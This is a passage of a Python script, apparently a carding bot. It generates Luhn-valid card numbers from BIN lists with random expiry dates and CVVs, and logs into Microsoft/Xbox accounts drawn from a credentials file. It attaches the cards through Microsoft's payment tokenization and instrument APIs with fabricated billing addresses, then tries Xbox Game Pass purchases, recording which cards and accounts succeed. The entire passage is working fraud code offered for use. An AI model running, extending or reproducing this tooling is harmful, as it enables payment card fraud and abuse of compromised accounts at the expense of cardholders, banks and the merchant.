            response = s.get(f"https://account.xbox.com/{locale}/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/",timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    try:
        rel = response.split('"http://mp.microsoft.com/":{')[1].split('},')[0]
        json_obj = json.loads("{"+rel+"}")
        xbl_auth = "XBL3.0 x=" + json_obj['userHash'] + ";" + json_obj['token']
        xbl_auth2 = str({"XToken":xbl_auth})
    except:
        sprint("[-] Failed to get XBL Authorization","y")
        remove_content("accs.txt",ms_creds)
        return
    
    while True:
        try:
            cvv_id = s.post("https://tokenization.cp.microsoft.com/tokens/cvv/getToken",timeout=20,json={"data":cvv}).json()["data"]
            break
        except request_exceptions:
            continue
        except KeyError:
            sprint(f"[-] Error while getting CVV token","c")
            return
        except Exception as e:
            sprint(e,"r")
            return
    while True:
        try:
            card_id = s.post("https://tokenization.cp.microsoft.com/tokens/pan/getToken",timeout=20,json={"data":card})
            card_id = card_id.json()["data"]
            
            break
        except request_exceptions:
            continue
        except KeyError:
            sprint(f"[-] Error while getting Pan token","c")
            sprint(card_id.text)
            return
        except Exception as e:
            sprint(e,"r")
            return

    
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://account.microsoft.com',
    'Referer': 'https://account.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=northstarweb,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
}

    params = {
    'type': 'visa,amex,mc',
    'partner': 'northstarweb',
    'operation': 'Add',
    'country': country_sm,
    'language': locale,
    'family': 'credit_card',
    'completePrerequisites': 'true',
}

    while True:
        try:
            response = s.get(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentMethodDescriptions',
    params=params,
    headers=headers,
    timeout=20
)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    heads = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://account.microsoft.com',
    'Referer': 'https://account.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=northstarweb,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
    'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
} 
    vcc_json = {
    'paymentMethodFamily': 'credit_card',
    'paymentMethodType': card_type,
    'paymentMethodOperation': 'add',
    'paymentMethodCountry': country_sm,
    'paymentMethodResource_id': 'credit_card.'+card_type,
    'context': 'purchase',
    'riskData': {
        'dataType': 'payment_method_riskData',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'greenId': str(uuid4()),
    },
    'details': {
        'dataType': 'credit_card_mc_details',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'accountHolderName': getRandomLetters(7).upper()+" "+getRandomLetters(5).upper(),
        'accountToken': card_id,
        'expiryMonth': exp_month,
        'expiryYear':  exp_year,
        'cvvToken': cvv_id,
        'address': {
            'addressType': 'billing',
            'addressOperation': 'add',
            'addressCountry': country_sm,
            'address_line1': "CASA DE JANOS NO. 1530, TORIBIO ORTEGA, 32675",
            'city': 'Chihuahua',
            'region': 'ch',
            'postal_code': postal_code,
            'country': country_sm,
        },
        'permission': {
            'dataType': 'permission_details',
            'dataOperation': 'add',
            'dataCountry': country_sm,
            'hmac': {
                'algorithm': 'hmacsha256',
                'keyToken': "null", 
                'data': "null", 
            },
            'userCredential': xbl_auth,
        },
    },
    'pxmac': response.json()[0]["data_description"]["pxmac"]["default_value"], 
}
    params = {
    'country': country_sm,
    'language': locale,
    'partner': 'northstarweb',
    'completePrerequisites': 'True',
}
    while True:
        try:
            vcc_req = s.post(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx',
    params=params,
    headers=heads,
    json=vcc_json,
    timeout=30
)   
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
    if not vcc_req.ok:
        if "InvalidRequestData" in vcc_req.text:
            vcc_list.insert(0,full_card)
        sprint(f"[-] Failed to add card!  Bin : {full_bin}","r")
        sprint(vcc_req.text,"y")
        try:
            vcc_list.remove(full_card)
        except:
            pass
        return
    sprint(f"[+] Added card! Bin : {full_bin}","c")
    prof_headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://www.microsoft.com',
    'Referer': 'https://www.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'correlation-context': 'v=1,ms.b.tel.scenario=commerce.payments.AddressAdd.1,ms.b.tel.partner=AccountMicrosoftCom,ms.c.cfs.payments.partnerSessionId=d8VcHbeGb0e90kU9',
    'ms-correlationid': str(uuid4()),
    'ms-requestid': str(uuid4()),
    'x-ms-pidlsdk-version': '1.21.2_jqueryview',
}

    prof_params = {
    'partner': 'webblends',
    'language': 'en-US',
    'avsSuggest': 'true',
}

    prof_json_data = {
    'addressType': 'billing',
    'addressCountry': 'us',
    'address_line1': getRandomLetters(100)+" "+getRandomLetters(5)+" "+getRandomInt(3),
    'city': 'New York',
    'region': 'ny',
    'postal_code': postal_code,
    'country': country_sm,
    'set_as_default_billing_address': 'True',
}

    while True:
        try:
            prof_response = s.post('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addressesEx', params=prof_params, headers=prof_headers, json=prof_json_data, timeout=30)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"y")
            return
    if not prof_response.ok:
        sprint('[-] Failed to set billing address!',"c")
        sprint(prof_response.text,"y")
        return
    prof_final_headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://www.microsoft.com',
    'Referer': 'https://www.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'correlation-context': 'v=1,ms.b.tel.scenario=commerce.payments.AddressAdd.1,ms.b.tel.partner=AccountMicrosoftCom,ms.c.cfs.payments.partnerSessionId=d8VcHbeGb0e90kU9',
    'ms-correlationid': str(uuid4()),
    'ms-requestid': str(uuid4()),
    'x-ms-pidlsdk-version': '1.21.2_jqueryview',
}

    prof_final_params = {
    'partner': 'webblends',
    'language': locale,
    'avsSuggest': 'False',
}

    prof_final_json_data = {
    'set_as_default_shipping_address': False,
    'set_as_default_billing_address': True,
    'is_user_entered': True,
    'id': 'entered',
    'country': country_sm,
    'region': 'ny',
    'city': 'New York',
    'address_line1': getRandomLetters(100)+" "+getRandomLetters(5)+" "+getRandomInt(3),
    'postal_code': postal_code,
    'is_customer_consented': True,
    'is_avs_full_validation_succeeded': False,
}

    while True:
        try:
            prof_final_response = s.post('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addressesEx', timeout=30, params=prof_final_params, headers=prof_final_headers, json=prof_final_json_data)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    
    if not prof_final_response.ok:
        sprint('[-] Failed to set billing address!',"c")
        sprint(prof_final_response.text,"y")
        return

    headers = {
    'authority': 'www.microsoft.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'origin': 'https://www.xbox.com',
    'referer': 'https://www.xbox.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}

    params = {
    'noCanonical': 'true',
    'market': locale.split('-')[1],
    'locale': locale,
}   
    productId = "CFQ7TTC0KHS0"
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive','Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
    'sec-ch-ua': '"Not_A Brand";v="99", "Brave";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


    while True:
        try:
            response = s.get(f'https://www.xbox.com/{locale}/xbox-game-pass', headers=headers)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    anonToken  = response.text.split('"anonToken":"')[1].split('","')[0]
    headers = {
    'authority': 'emerald.xboxservices.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': xbl_auth,
    "ms-cv" :"BX1+FrPZZt2eSrZyAU9FE+.7",
    'origin': 'https://www.xbox.com',
    'referer': 'https://www.xbox.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': ua,
    'x-ms-api-version': '1.0',
    'x-s2s-authorization': f'Bearer '+anonToken,
}
    params={
    'locale': locale,
}
    while True:
        try:
            response = s.get(
    f'https://emerald.xboxservices.com/xboxcomfd/contextualStore/productDetails/{productId}',
    params=params,
    headers=headers,
)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return

    avalibilityId = response.json()["productSummaries"][0]["specificPrices"]["purchaseable"][0]["availabilityId"]
    params = {
    'noCanonical': 'true',
    'market': locale.split('-')[1],
    'locale': locale,
}   
    data = {
    'data': '{"products":[{"productId":"'+productId+'","skuId":"0007","availabilityId":"'+avalibilityId+'"}],"campaignId":"xboxcomct","callerApplicationId":"XboxCom","expId":["EX:sc_xboxgamepad","EX:sc_xboxspinner","EX:sc_xboxclosebutton","EX:sc_xboxuiexp","EX:sc_disabledefaultstyles","EX:sc_gamertaggifting"],"flights":["sc_xboxgamepad","sc_xboxspinner","sc_xboxclosebutton","sc_xboxuiexp","sc_disabledefaultstyles","sc_gamertaggifting"],"clientType":"XboxCom","data":{"usePurchaseSdk":"true"},"layout":"Modal","cssOverride":"XboxCom2NewUI","theme":"light","scenario":"","suppressGiftThankYouPage":"false"}',
    'auth': xbl_auth2,
}
    while True:
        try:
            response = s.post('https://www.microsoft.com/store/buynow',timeout=30, params=params, headers=headers, data=data)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not response.ok:
        sprint("[-] Error while accessing buynow endpoint! Status code : {} (IP probably banned)".format(response.status_code),"c")
        return
    currencyCode = response.text.split('"currencyCode":"')[1].split('"')[0]
    pi_id = response.text.split('{"paymentInstrumentId":"')[1].split('"')[0]
    riskId = response.text.split('"riskId":"')[1].split('"')[0]
    cartId = response.text.split('"cartId":"')[1].split('"')[0]
    muid = response.text.split('"alternativeMuid":"')[1].split('"')[0]
    vectorId = response.text.split('"vectorId":"')[1].split('"')[0]
    corId = response.text.split('"correlationId":"')[1].split('"')[0]
    trackId = response.text.split('"trackingId":"')[1].split('"')[0]
    akkuId = response.text.split(',"accountId":"')[1].split('"')[0]
    id_id = response.text.split(',"soldToAddressId":"')[1].split('"')[0]
    ses_id = response.text.split('"sessionId":"')[1].split('"')[0]
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://www.microsoft.com',
    'Referer': 'https://www.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=ndstkS61HgKfmXpx8X9IP2',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-ms-flight': 'EnableThreeDSOne',
    'x-ms-pidlsdk-version': '1.22.0_reactview',
}
    payment_ses_data= {
	"piid": vcc_req.json()["id"],
	"language": locale,
	"partner": "webblends",
	"piCid": vcc_req.json()["accountId"],
	"amount": 1,
	"currency": currencyCode,
	"country": country_sm.upper(),
	"hasPreOrder": "false",
	"challengeScenario": "RecurringTransaction",
	"challengeWindowSize": "03",
	"purchaseOrderId": cartId
}

    params = {
    'paymentSessionData': str(payment_ses_data),
    'operation': 'Add',
}

    while True:
        try:
            response = s.get(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentSessionDescriptions',timeout=30,
    params=params,
    headers=headers,
)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not response.ok:
        sprint("[-] Error while getting 3ds ID","c")
        return
    threedsId = response.json()[0]["clientAction"]["context"]["id"]
    s.proxies=None
    headers = {
    'authority': 'cart.production.store-web.dynamics.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'ms-cv':generateHexStr(21)+"b.46.2",
    'origin': 'https://www.microsoft.com',
    'referer': 'https://www.microsoft.com/',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': ua,
    'x-authorization-muid': muid,
    'x-ms-correlation-id': corId,
    'x-ms-tracking-id': trackId,
    'x-ms-vector-id': vectorId,
}

    params = {
    'cartId': cartId,
    'appId': 'BuyNow',
}

    json_data = {
    'locale': locale,
    'market': country_sm.upper(),
    'catalogClientType': '',
    'clientContext': {
        'client': 'XboxCom',
        'deviceFamily': 'Web',
    },
    'flights': prePareCartFlights,
    'paymentInstrumentId': pi_id,
    'csvTopOffPaymentInstrumentId': None,
    'billingAddressId': {
        'accountId': akkuId,
        'id': id_id,
    },
    'sessionId': ses_id,
    'orderState': 'CheckingOut',
}

    while True:
        try:
            response = s.put(
    'https://cart.production.store-web.dynamics.com/cart/v1.0/cart/updateCart',timeout=60,
    params=params,
    headers=headers,
    json=json_data,
)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not response.ok:
        sprint("[-] Error while updating Cart","y")
        return
    headers = {
    'authority': 'cart.production.store-web.dynamics.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'ms-cv': generateHexStr(21)+"b.46.2",
    'origin': 'https://www.microsoft.com',
    'referer': 'https://www.microsoft.com/',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': ua,
    'x-authorization-muid': muid,
    'x-ms-correlation-id': corId,
    'x-ms-tracking-id': trackId,
    'x-ms-vector-id': vectorId,
}

    params = {
    'appId': 'BuyNow',
}

    json_data = {
    'cartId': cartId,
    'market': country_sm.upper(),
    'locale': locale,
    'catalogClientType': '',
    'callerApplicationId': '_CONVERGED_XboxCom',
    'clientContext': {
        'client': 'XboxCom',
        'deviceFamily': 'Web',
    },
    'paymentSessionId': ses_id,
    'riskChallengeData': {
        'type': 'threeds2',
        'data': threedsId,
    },
    'paymentInstrumentId': pi_id,
    'paymentInstrumentType': card_type,
    'email': email,
    'csvTopOffPaymentInstrumentId': None,
    'billingAddressId': {
        'accountId': akkuId,
        'id': id_id,
    },
    'currentOrderState': 'CheckingOut',
    'flights': purchaseFlights,
    'itemsToAdd': {},
}

    while True:
        try:
            response = s.post(
    'https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase',timeout=30,
    params=params,
    headers=headers,
    json=json_data,
)   
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not response.ok:
        sprint(f"[-] Failed to purchase Gamepass! "+email,"y")
        sprint(response.text,"c")
        remove_content("accs.txt",ms_creds)
        open("failed.txt","a").write(ms_creds+"\n")
        return
    try:
        gand = response.json()["cart"]["id"]
        sprint(response.text,"c")
        sprint(f"[+] Purchased Gamepass! Bin : {full_bin} | Account {ms_creds} ","c")
        vcc_list.insert(0,full_card)
        open("gamepass_accs.txt","a").write(ms_creds+"\n")
        remove_content("accs.txt",ms_creds)
    except:
        sprint(f"[-] Failed to purchase Gamepass! Bin : {full_bin}","y")
        sprint(response.text,"c")
        remove_content("accs.txt",ms_creds)
        open("failed.txt","a").write(ms_creds+"\n")

def checkLuhn(cardNo):
     
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
     
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
     
        if (isSecond == True):
            d = d * 2
        nSum += d // 10
        nSum += d % 10
  
        isSecond = not isSecond
     
    if (nSum % 10 == 0):
        return True
    else:
        return False
    
def getValidCard(full_bin : str):
    cardBin = full_bin.split("|")[0].replace("x","")
    binMonth = full_bin.split("|")[1]
    binYear = full_bin.split("|")[2]
    cvv = full_bin.split("|")[3]
    randDigitLen = 16-len(cardBin)
    while True:
        UnchckCCN = cardBin+getRandomInt(randDigitLen)
        if checkLuhn(UnchckCCN):
            ccn = UnchckCCN
            break
        else:
            continue
    if binMonth=="rnd":
        mnth = str(random.randint(1,12))
    else:
        mnth=binMonth
    if binYear=="rnd":
        year = str(random.randint(2022,2030))
    else:
        year = binYear
    if cvv=="rnd":
        cvc = str(random.randint(000,999))
    else:
        cvc = cvv
    full_card = f"{ccn}|{mnth}|{year}|{cvc}"
    return full_card
colorama.init()

def add_thread(full_bin : str):
    vcc_list = []
    for t in range(10000):
        vcc_list.append(getValidCard(full_bin))
    while True:
        try:
            acc = random.choice(open("accs.txt","r").read().splitlines())
        except:
            sprint("[-] Out of accounts!","y")
            break
        vcc = vcc_list[0]
        main(acc,vcc,full_bin,vcc_list)
        vcc_list.pop(0)
bins = open("bins.txt").read().splitlines()
thread_list = []
for rn in range(len(bins)):
    b1n = bins[rn]
    strt = threading.Thread(target=add_thread,args=(b1n,))
    thread_list.append(strt)
    strt.start()
for thr in thread_list:
    thr.join()